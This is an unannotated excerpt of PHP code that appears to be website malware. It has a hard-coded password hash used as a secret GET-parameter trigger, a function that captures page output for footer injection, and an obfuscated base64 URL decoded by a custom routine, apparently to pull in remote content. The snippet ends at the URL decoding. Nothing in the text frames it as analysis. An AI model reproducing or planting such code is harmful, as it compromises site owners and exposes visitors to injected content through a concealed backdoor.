...
$p = $_POST;
$_passssword = 'd996457a3b4fcd2443958238221b1688';
...
function add_2footer() {
    $check = false;
    $check_data = "";
    if (!empty($_GET['check']) AND $_GET['check'] == 'd996457a3b4fcd2443958238221b1688') {
        $check = true;
    ...
    if (preg_match($regexp, $buffer, $m)) {
        $body = $m[0];
//        $url = base64_decode('a3d3czksLDI2Mi0xMjQtNjQtMjQ7LGFvbGQsPGFmd2IldnduXHBsdnFgZj43NTAyNjkyMDM6Mzc3OTEzOjQ=');
        $url = decrypt_url('a3d3czksLDI2Mi0xMjQtNjQtMjQ7LGFvbGQsPGFmd2IldnduXHBsdnFgZj43NTAyNjkyMDM6Mzc3OTEzOjQ=');
